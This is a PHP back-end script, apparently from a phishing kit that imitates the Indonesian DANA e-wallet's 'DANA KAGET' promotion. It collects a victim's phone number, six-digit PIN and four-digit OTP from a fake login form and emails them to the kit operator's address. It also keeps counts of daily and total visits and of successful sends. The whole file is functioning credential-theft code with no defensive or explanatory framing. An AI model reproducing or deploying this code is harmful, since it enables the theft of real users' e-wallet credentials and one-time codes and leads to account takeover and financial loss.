<?php 

// MENANGKAP DATA YANG DI-INPUT
$phone_number = $_POST['phone_number'];

$pin1 = $_POST['pin1'];
$pin2 = $_POST['pin2'];
$pin3 = $_POST['pin3'];
$pin4 = $_POST['pin4'];
$pin5 = $_POST['pin5'];
$pin6 = $_POST['pin6'];
$_pin = $pin1.$pin2.$pin3.$pin4.$pin5.$pin6;

$otp1 = $_POST['otp1'];
$otp2 = $_POST['otp2'];
$otp3 = $_POST['otp3'];
$otp4 = $_POST['otp4'];
$_otp = $otp1.$otp2.$otp3.$otp4;

// KONTEN RESULT AKUN
$subjek = "AKUN DANA PUNYA SI [ $phone_number ]";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
                font-size: 17px;
				width: 90%;
				display: block;
				margin: auto;
				background: #fff;
			}
            table, tr {
            margin-bottom: 10px;
            }
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
<tr>					
					<th style="text-align: center;" colspan="3">=== Info Login DANA KAGET ===</th>
				</tr>
				<tr>
					<td style="border-right: none;">No HP : $phone_number</td>
				</tr>
                <tr>
					<td style="border-right: none;">PIN AKUN : $_pin</td>
				</tr>
                <tr>
					<td style="border-right: none;">OTP : $_otp</td>
				</tr>
				<tr>					
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;

// TODAY
$Tget = file_get_contents("etc/visitor.json");
$Tdecode = json_decode($Tget,true);
$today = $Tdecode['today'] + 1;
$Tdecode['today'] = $today;
$Tresult = json_encode($Tdecode);
            $Tfile = fopen('etc/visitor.json','w');
                     fwrite($Tfile,$Tresult);
                     fclose($Tfile);
                     
// YESTERDAY
if(date("H:i") == "01:00"){
$Yget = file_get_contents("etc/visitor.json");
$Ydecode = json_decode($Yget,true);
$Ydecode['yesterday'] = $Ydecode['today'];
$Ydecode['today'] = 0;
$Yresult = json_encode($Ydecode);
            $Yfile = fopen('etc/visitor.json','w');
                     fwrite($Yfile,$Yresult);
                     fclose($Yfile);
}

// ALL OVER
$Aget = file_get_contents("etc/visitor.json");
$Adecode = json_decode($Aget,true);
$all = $Adecode['total'] + 1;
$Adecode['total'] = $all;
$Aresult = json_encode($Adecode);
            $Afile = fopen('etc/visitor.json','w');
                     fwrite($Afile,$Aresult);
                     fclose($Afile);

// RESULT DATA
$resultGet = file_get_contents("etc/data.json");
$resultData = json_decode($resultGet,true);

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: '.$resultData['nama'].' <yumekodeveloper@gmail.com>' . "\r\n";

if(mail($resultData['email'], $subjek, $pesan, $headers))
{
$upGet = file_get_contents("etc/data.json");
$upData = json_decode($upGet,true);
$hasil = $upData['totals'] + 1;
$upData['totals'] = $hasil;
$upResult = json_encode($upData);
$upFile = fopen('etc/data.json','w');
          fwrite($upFile,$upResult);
          fclose($upFile);
}

